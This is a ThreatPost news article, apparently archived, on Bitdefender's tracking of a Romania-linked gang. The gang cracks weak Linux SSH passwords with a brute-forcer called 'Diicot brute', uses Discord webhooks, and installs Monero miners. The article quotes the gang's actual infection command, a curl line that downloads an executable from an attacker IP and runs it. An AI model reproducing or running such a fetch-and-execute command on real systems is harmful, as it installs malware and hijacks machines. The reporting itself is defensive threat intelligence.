# Linux-Focused Cryptojacking Gang Tracked to Romania
### The gang is using a new brute-forcer – “Diicot brute” – to crack passwords on Linux-based machines with weak passwords. 

## Information:
+ Source: ThreatPost
+ Link: [article](https://kasperskycontenthub.com/threatpost-global/?p=167783)
+ Date: July 14, 2021  12:45 pm
+ Author: Lisa Vaas


## Article:
A cryptojacking gang that’s likely based in Romania is using a never-before-seen SSH brute-forcer dubbed “Diicot brute” to crack passwords on Linux-based machines with weak passwords.


The point of the campaign is mainly to deploy Monero mining malware, Bitdefender researchers said in a [report](https://www.bitdefender.com/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign) published on Wednesday, though the gang’s kit could let them attempt other types of attacks. Researchers said that they’ve connected the group to at least two distributed-denial-of-service (DDoS) botnets: a variant of the Linux-based DDoS [DemonBot](https://threatpost.com/demonbot-fans-ddos-flames-with-hadoop-enslavement/138597/) botnet called “chernobyl” and a Perl IRC bot.



Why [cryptojacking](https://threatpost.com/hackers-crack-pirated-games-malware/167263/)? Because it’s a sweet short-cut to get to the loot. “As you all know, mining for cryptocurrency is slow and tedious, but it can go faster when using multiple systems,” according to the report. “Owning multiple systems for mining is not cheap, so attackers try the next best thing: To remotely compromise devices and use them for mining instead.”


 


No Shortage of Cruddy Credentials on Linux Machines
---------------------------------------------------


Weak passwords are no surprise: Default usernames and passwords, or weak credentials that can easily be cracked through brute-forcing, are a ubiquitous and unfortunate given in security.


“Hackers going after weak SSH credentials is not uncommon,” the report explained. The tricky part isn’t necessarily brute-forcing credentials but rather “doing it in a way that lets attackers go undetected,” according to researchers.


As analysts explained, the author of the Diicot brute tool claimed that it can filter out honeypots. Maybe so, but “this investigation is proof that it doesn’t, or at least it couldn’t evade ours,” they wrote.


Bitdefender’s honeypot data shows that attacks matching the brute-force tool’s signature started in January. The campaign isn’t pulling the worm move of propagating on compromised systems at this point, they said, at least not yet: “The IP addresses they originate from belong to a relatively small set, which tells us that the threat actors are not yet using compromised systems to propagate the malware (worm behavior).”


Traced to Romania
-----------------


Bitdefender identified the threat group by analyzing its tools and methods, which include heavy obfuscation with Bash scripts that are compiled with a shell script compiler (shc). The threat actors also used Discord to report the information back: An increasingly popular move by attackers.


Malicious abuse of collaboration tools like Slack and Discord to evade security and deliver info-stealers, remote-access trojans (RATs) and other malware has exploded: In April, Cisco’s Talos cybersecurity team said in a report on [collaboration app abuse](https://blog.talosintelligence.com/2021/04/collab-app-abuse.html) that they found [20,000 virus results](https://threatpost.com/attackers-discord-slack-malware/165295/) on just one Discord network search.


Using Discord accomplishes a few things: It relieves attackers of having to host their own command-and-control (C2) server, since webhooks are means to post data on Discord channel programmatically, the report explained. Also, Discord presents gathered data for convenient viewing on a channel.


“Discord is increasingly popular among threat actors because of this functionality, as it involuntarily provides support for malware distribution (use of its CDN), C2 (webhooks) or creating communities centered around buying and selling malware source code and services (e.g. DDoS),” the writeup continued.


That information also lets the threat actor assess how well their tools are doing at infecting machines. As well, the threat actor can sweep up the list of victims for future, potential, post-exploitation hijinxs.


What Triggered the Cryptojacking Tracking?
------------------------------------------


Analysts first started investigating the group in May, when they discovered cryptojacking campaign with the “.93joshua” loader. Surprisingly enough, it was easy to trace the malware to “http://45[.]32[.]112[.]68/.sherifu/.93joshua” in an open directory.


“It turns out that the server hosted other files,” analysts noted. “Although the group hid many of the files, their inclusion in other scripts revealed their presence.” They found that the associated domain, mexalz.us, has hosted malware “at least since February.”


 


Cryptojacking Tools At Your Service
-----------------------------------


From what Bitdefender could suss out, the brute-forcer is distributed on an as-a-service model, given that it uses a centralized API server.


The threat actors who lease the tool supply their API key in their scripts, according to the report. This is where the Romania link comes in, it explained: “Like most other tools in this kit, the brute-force tool has its interface in a mix of Romanian and English. This leads us to believe that its author is part of the same Romanian group.”


The threat group has been active since at least 2020, they said.


Attack Chain
------------


Before they have to cover their tracks by techniques such as hiding behind Discord, cryptojackers first need to find weak credentials, which they accomplish through scanning. The researchers said that the cryptojacking attackers in this instance host several archives on the server, including jack.tar.gz, juanito.tar.gz, scn.tar.gz and skamelot.tar.gz.


The archives contain toolchains for cracking servers with weak SSH credentials, a process that includes these three stages:


The attackers used the tools “ps” and “masscan” for reconnaissance, analysts explained, while “99x / haiduc” (both Outlaw malware) and “brute” are used for credential access and initial access. Besides traditional tools such as “masscan” and “zmap,” the threat actors’ toolkit in this case included the previously unreported SSH brute-forcer – Diicot brute – written in Go.


The campaign, which is still active, includes the use of “skamelot.tar.gz”, which includes the following files:


The infection payload executed in the SSH sessions is “curl -O http://45[.]32[.]112[.]68/.sherifu/.93joshua && chmod 777 .93joshua && ./.93joshua && uname -a”.


Analysts said that the payload file is still online, but the attackers have moved it over to mexalz.us.


The group is also using custom compiled binaries with embedded configurations of a legitimate miner named [XMRig](https://github.com/xmrig/xmrig) – an open-source miner that’s been [adapted for cryptojacking](https://threatpost.com/new-cryptominer-distributes-xmrig-in-aggressive-attacks/132027/) in the past.


‘Brute Force Still Works’
-------------------------


This wouldn’t work if not for lousy passwords that give attackers an easy way to take over machines, the report emphasized.


“People are the simple reason why brute-forcing SSH credentials still works,” researchers wrote. Whatever tools are needed to do that brute forcing, the group itself developed them in this case.


Analysts found that tool – Diicot brute – in the jack.tar.gz and juanito.tar.gz archives. Unlike most of the tools used by Mexalz, it can’t be used by itself: Rather, it’s meant to be rented out on a SaaS model.


Attackers’ Tool Reuse Leads to Easier Tracking
----------------------------------------------


Joseph Carson, chief security scientist and advisory CISO at cloud identity security firm ThycoticCentrify, told Threatpost on Wednesday that, relatively speaking, this campaign isn’t all that sophisticated, in spite of its use of a new brute-force tool. “The techniques being used have been shared too often on the darknet, making it easy for anyone with a computer and an internet connection to start a cryptojacking campaign,” he said via email.


What helps in tracking such gangs is that they have their favorite methods and techniques, Carson continued. “When used often enough, these create a common fingerprint which can be used to track you digitally,” he said. “The ones that are tough to track are the ones who hide behind stolen code or never reuse the same methods and techniques again.”


For each and every new campaign, they do something completely different, Carson elaborated. But such attackers are typically “well-funded and resourced,” he noted. “Most cybercriminals will take the easy path and [that] is to reuse as [many] existing tools and techniques as possible. It will really depend on whether the attacker cares about being discovered or not.”


The more steps an attacker takes to stay hidden “tends to mean they operate within a country which they could be prosecuted if discovered,” Carson said.


***Check out our free*** [***upcoming live and on-demand webinar events***](https://threatpost.com/category/webinars/) ***– unique, dynamic discussions with cybersecurity experts and the Threatpost community.***




#### Tags:
[[malware]] [[gz]] [[cryptojacking]] [[SSH]] [[93joshua]] [[Diicot]] [[Bitdefender]] [[Romania]] [[brute-forcer]] [[DDoS]] [[ThreatPost]]
